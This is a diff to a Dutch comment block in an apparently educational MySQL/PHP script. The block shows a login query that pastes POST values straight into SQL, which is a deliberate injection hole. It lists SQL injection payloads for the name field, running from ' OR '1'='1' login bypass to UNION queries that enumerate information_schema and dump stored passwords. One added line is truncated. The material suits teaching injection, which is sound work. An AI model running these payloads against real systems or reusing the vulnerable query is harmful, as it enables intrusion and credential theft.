@@ -1,7 +1,6 @@
 /*
 Dit mysql script kun je gebruiken met en zonder encyptie van passwords
 
-Installeer 'inserts.sql'
 Hiermee worden 2 tabellen geïnstalleerd te weten:
 - user: met encryptie
 - userplainpasswords: zonder encryptie
@@ -34,10 +33,13 @@ Gebruik als query:
 $query = "SELECT * FROM userplainpasswords WHERE name = '".$_POST["voornaam"]."' and password = '".$_POST["wachtwoord"]."'";
 //$query = "SELECT iduser, name FROM userplainpasswords WHERE name = '".$_POST["voornaam"]."' and password = '".$_POST["wachtwoord"]."'";
 
- * plak bij naam: lkjlkj' OR '1' = '1' #'
- * lkjlkj' OR '1' = '1' UNION SELECT 'a' #'
- * lkjlkj' OR '1' = '1' UNION SELECT 'a', 'b','c'; #'
- * lkjlkj' OR '1' = '1' UNION SELECT 'a', database(), 'c';#
- * lkjlkj' OR '1' = '1' UNION SELECT table_schema,table_name, table_type FROM information_Schema.tables WHERE TABLE_TYPE = 'BASE TABLE';#
+plak bij naam: lkjlkj' OR '1' = '1' #'
+lkjlkj' OR '1' = '1' UNION SELECT 'a' #'
+lkjlkj' OR '1' = '1' UNION SELECT 'a', 'b','c'; #'
+lkjlkj' OR '1' = '1' UNION SELECT 'a', database(), 'c';#
+lkjlkj' OR '1' = '1' UNION SELECT table_schema,table_name, table_type FROM information_Schema.tables WHERE TABLE_TYPE = 'BASE TABLE';#
+lkjlkj' OR '1' = '1' UNION SELECT table_schema,column_name,table_name FROM information_Schema.columns WHERE table_name = 'userplainpasswords';#
+lkjlkj' OR '1' = '1' UNION SELECT iduser, password, name from userplainpasswords;#
+lkjlkj' OR '1' = '1' UNION SELECT Ts;#
 
 
